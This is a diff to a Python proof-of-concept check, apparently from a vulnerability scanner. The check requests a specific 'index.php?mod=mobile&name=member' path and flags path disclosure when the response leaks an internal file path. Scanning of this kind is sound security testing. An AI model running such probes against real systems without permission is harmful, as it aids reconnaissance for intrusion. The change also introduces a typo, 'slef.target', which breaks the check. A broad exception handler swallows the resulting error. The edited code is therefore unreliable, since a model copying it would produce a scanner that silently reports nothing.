@@ -46,18 +46,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
             payload = "/index.php?mod=mobile&name=member&do=index"
 
-            vul_url = arg + payload
+            vul_url = slef.target + payload
             headers = {
                 'Content-Type': 'application/x-www-form-urlencoded',
             }
             response = requests.get(vul_url)
             self.output.info("正在构造路径泄露测试语句")
             if response.status_code == 200 and '/system/member/mobile.php' in response.text and 'ModuleSite' in response.text:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name,url=vul_url))
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
 
